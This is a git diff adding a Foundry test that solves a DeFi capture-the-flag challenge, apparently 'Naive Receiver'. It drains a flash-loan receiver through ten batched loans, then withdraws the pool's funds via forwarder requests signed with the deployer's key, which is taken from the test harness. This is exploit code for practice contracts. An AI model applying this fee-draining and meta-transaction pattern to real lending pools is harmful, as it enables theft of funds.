@@ -77,7 +77,104 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // get the deployer private key
+        (, uint deploPk) = makeAddrAndKey("deployer");
+        // build the bytes array for the multicall 
+        bytes[] memory calls = new bytes[](10);
+        for (uint i; i < 10; ++i) {
+            calls[i] = abi.encodeWithSelector(
+                NaiveReceiverPool.flashLoan.selector,
+                address(receiver),
+                address(weth),
+                1 ether,
+                bytes("")
+            );
+        }
+
+        // multicall payload
+        bytes memory multicallPayload = abi.encodeWithSelector(
+            Multicall.multicall.selector,
+            calls
+        );
+
+        // request structure
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: deployer,
+            target: address(pool),
+            value: 0,
+            gas: 5_000_000,
+            nonce: forwarder.nonces(deployer),
+            data: multicallPayload,
+            deadline: block.timestamp + 1 days
+        });
+
+        // calculate el digest to firm the request
+        bytes32 structHash  = forwarder.getDataHash(request);
+        bytes32 domainSeparator = forwarder.domainSeparator();
+
+        // Build the digest EIP-712
+        bytes32 digest = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                domainSeparator,
+                structHash
+            )
+        );
+
+        // sign the request
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(deploPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // call the forwarder to execute the multicall
+         (bool success,) = address(forwarder).call{value: 0}(
+            abi.encodeWithSignature(
+                "execute((address,address,uint256,uint256,uint256,bytes,uint256),bytes)",
+                request,
+                signature
+            )
+        );
+
+        // call again to withdraw all funds
+        bytes memory withdrawPayload = abi.encodeWithSelector(
+            NaiveReceiverPool.withdraw.selector,
+            WETH_IN_POOL + WETH_IN_RECEIVER,
+            recovery
+        );
+
+        // get struct hash for withdraw
+        BasicForwarder.Request memory withdrawRequest = BasicForwarder.Request({
+            from: deployer,
+            target: address(pool),
+            value: 0,
+            gas: 5_000_000,
+            nonce: forwarder.nonces(deployer),
+            data: withdrawPayload,
+            deadline: block.timestamp + 1 days
+        });
+
+        // calculate el digest to firm the withdraw request
+        structHash = forwarder.getDataHash(withdrawRequest);
+       
+        digest = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                domainSeparator,
+                structHash
+            )
+        );
+        // sign the withdraw request
+        (v, r, s) = vm.sign(deploPk, digest);
+        signature = abi.encodePacked(r, s, v);
+
+        // call the forwarder to execute the withdraw
+        address(forwarder).call{value: 0}(
+            abi.encodeWithSignature(
+                "execute((address,address,uint256,uint256,uint256,bytes,uint256),bytes)",
+                withdrawRequest,
+                signature
+            )
+        );
+
     }
 
     /**
